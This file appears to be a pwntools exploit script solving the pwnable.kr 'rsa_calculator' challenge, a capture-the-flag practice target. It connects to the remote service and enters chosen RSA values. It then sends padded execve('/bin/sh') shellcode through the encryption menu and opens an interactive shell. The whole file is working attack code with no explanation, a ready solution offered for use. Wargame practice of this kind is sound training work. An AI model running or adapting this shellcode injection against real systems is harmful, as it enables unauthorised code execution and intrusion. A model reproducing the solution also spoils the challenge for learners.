from pwn import *

context.log_level = "debug"
context.arch = "amd64"

p = remote('pwnable.kr', 9012) # process("rsa_calculator")

shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))

print("[*] shellcode :", shellcode)

payload = shellcode
payload += b"@" * (265 - len(payload))

print("[*] payload length :", len(payload))

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b" : ", b"3763") # p
p.sendlineafter(b" : ", b"2784") # q
p.sendlineafter(b" : ", b"4") # e
p.sendlineafter(b" : ",  b"11549601") # d

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b" : ", b"265")
p.sendlineafter(b"text data", payload)

p.sendlineafter(b"> ", b"1")

p.interactive()

# used tool https://ko.numberempire.com/numberfactorizer.php